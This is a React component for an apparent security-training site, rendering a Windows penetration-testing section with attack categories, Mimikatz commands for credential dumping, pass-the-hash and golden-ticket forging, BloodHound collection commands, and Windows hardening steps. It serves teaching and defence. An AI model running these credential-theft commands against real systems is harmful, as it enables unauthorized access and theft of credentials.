import React from 'react';
import { Monitor, Shield, Bug, Terminal } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';

const WindowsSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Monitor className="text-cybr-primary" />
          Windows Penetration Testing
        </h2>
        <p className="mb-4">
          Windows environments are prevalent in enterprise settings and present unique security challenges.
          Penetration testing Windows systems requires understanding of the Windows architecture, security model,
          and common misconfigurations.
        </p>
      </div>
      
      <div className="card mb-10">
        <h3 className="text-2xl font-bold mb-4">Key Areas to Focus</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h4 className="text-lg font-semibold mb-2 flex items-center gap-2">
              <Bug className="text-cybr-primary h-5 w-5" />
              Local Privilege Escalation
            </h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Unquoted service paths</li>
              <li>DLL hijacking</li>
              <li>Always Install Elevated</li>
              <li>Scheduled tasks</li>
              <li>Insecure service permissions</li>
            </ul>
            <p className="mt-2 text-sm">
              Privilege escalation techniques allow attackers to gain higher levels of access once they have some initial foothold.
            </p>
          </div>
          
          <div>
            <h4 className="text-lg font-semibold mb-2 flex items-center gap-2">
              <Bug className="text-cybr-primary h-5 w-5" />
              Windows Authentication
            </h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>NTLM vulnerabilities</li>
              <li>Kerberos attacks</li>
              <li>Pass-the-Hash</li>
              <li>Pass-the-Ticket</li>
              <li>Credential harvesting</li>
            </ul>
            <p className="mt-2 text-sm">
              Windows authentication mechanisms can be exploited to gain unauthorized access to systems.
            </p>
          </div>
          
          <div>
            <h4 className="text-lg font-semibold mb-2 flex items-center gap-2">
              <Bug className="text-cybr-primary h-5 w-5" />
              File System Security
            </h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>NTFS permissions</li>
              <li>Alternate data streams</li>
              <li>Sensitive file disclosure</li>
              <li>Windows registry</li>
            </ul>
            <p className="mt-2 text-sm">
              File system security controls can often be misconfigured, leading to information disclosure.
            </p>
          </div>
          
          <div>
            <h4 className="text-lg font-semibold mb-2 flex items-center gap-2">
              <Bug className="text-cybr-primary h-5 w-5" />
              Remote Access
            </h4>
            <ul className="list-disc pl-6 space-y-1">
              <li>Remote Desktop Protocol (RDP)</li>
              <li>WinRM/PowerShell Remoting</li>
              <li>SMB shares</li>
              <li>Windows Firewall bypasses</li>
            </ul>
            <p className="mt-2 text-sm">
              Remote access features can be exploited to gain access to Windows systems from the network.
            </p>
          </div>
        </div>
      </div>
      
      <div className="mb-10">
        <h3 className="text-2xl font-bold mb-6">Windows Penetration Testing Techniques</h3>
        
        <div className="space-y-6">
          <SecurityCard
            title="PowerShell Empire"
            description="A post-exploitation framework that utilizes PowerShell to deliver attacks and maintain persistence on Windows systems."
            icon={<Terminal className="h-6 w-6" />}
            severity="high"
          />
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              Mimikatz Usage
            </h4>
            <p className="mb-3">
              Mimikatz is a powerful tool for extracting plaintexts passwords, hashes, and Kerberos tickets from memory:
            </p>
            
            <CodeExample
              language="powershell"
              code={`# Privilege::debug to get debug privileges
privilege::debug

# Extract passwords from memory
sekurlsa::logonpasswords

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:target.local /ntlm:NTLMHashHere

# Golden ticket attack
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-...`}
              title="Common Mimikatz Commands"
              isVulnerable={true}
            />
          </div>
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              BloodHound
            </h4>
            <p className="mb-3">BloodHound is used to reveal the hidden and often unintended relationships within an Active Directory environment:</p>
            
            <CodeExample
              language="powershell"
              code={`# Using SharpHound collector
.\\SharpHound.exe -c All --outputdirectory C:\\BloodHound

# Or using the PowerShell collector
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\BloodHound`}
              title="BloodHound Data Collection"
            />
          </div>
        </div>
      </div>
      
      <div className="card">
        <h3 className="text-2xl font-bold mb-4">Defensive Measures</h3>
        <div className="space-y-4">
          <div>
            <h4 className="text-lg font-semibold">Securing Windows Systems</h4>
            <CodeExample
              language="powershell"
              code={`# Enable Windows Defender Credential Guard
# (In Group Policy Editor)
# Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security

# Check AppLocker status
Get-AppLockerPolicy -Effective | Format-List

# Disable unnecessary services
Get-Service WinRM | Stop-Service -PassThru | Set-Service -StartupType Disabled

# Enable PowerShell logging
New-Item -Path "HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1`}
              title="Hardening Windows Systems"
              isVulnerable={false}
            />
          </div>
        </div>
      </div>
    </section>
  );
};

export default WindowsSection;
